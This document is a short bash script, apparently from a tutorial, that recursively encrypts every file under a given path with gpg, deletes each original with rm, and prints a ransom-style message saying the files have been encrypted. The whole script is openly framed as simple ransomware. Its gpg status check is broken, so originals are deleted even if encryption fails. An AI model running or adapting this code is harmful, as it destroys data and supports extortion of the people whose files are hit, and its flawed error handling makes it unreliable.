#!/bin/bash

#In this line we check that an
#argument is provided or not
if [ -z "$1" ]; then
echo "No file provided" >&2
exit 1
fi

figlet Encrypting Files!

#reading the password which would
#be used for encryption
read -p "Enter the password" pass

function func()
{
file_name=$1

#checking if the provided
#argument is a directory
if [ -d `realpath $file_name` ]; then

#going to the location
#of the directory
cd `realpath $file_name`

#saving the output of the
#“ls | uniq” in an array
array=(`ls | uniq `)	

#storing the length of the
#array in a variable
len=${#array[*]}	
i=0

#looping through all the
#indices of the array
while [ $i -lt $len ]; do

#displaying the file in
#the index right now
echo "${array[$i]}"

#recursively calling the function
func ${array[$i]}

#increasing the counter
let i++

done
fi

#checking if the argument is a file
if [ -f `realpath $file_name` ]; then

#encrypting the file with the given password
#and storing the return value of the gpg
#in a variable
test= echo $pass | gpg -c --batch --yes --passphrase-fd 0 $file_name

#checking if the gpg
#executed properly or not
if [ "$test" == "1" ]; then

#writing to the standard error
echo "Bad signature: gpg not executed properly" >&2
exit 1

#checking if the gpg
#executed properly or not
elif [ "$test" == "2" ]; then

#writing to the standard error
echo "unexpected error: gpg not executed properly" >&2
exit 1

else

#deleting the original file
rm $file_name

#displaying the gpg created
echo " $file_name.gpg "	
fi
fi
}
func $1

#echo Ransom Message
echo "Your files have been encrypted."

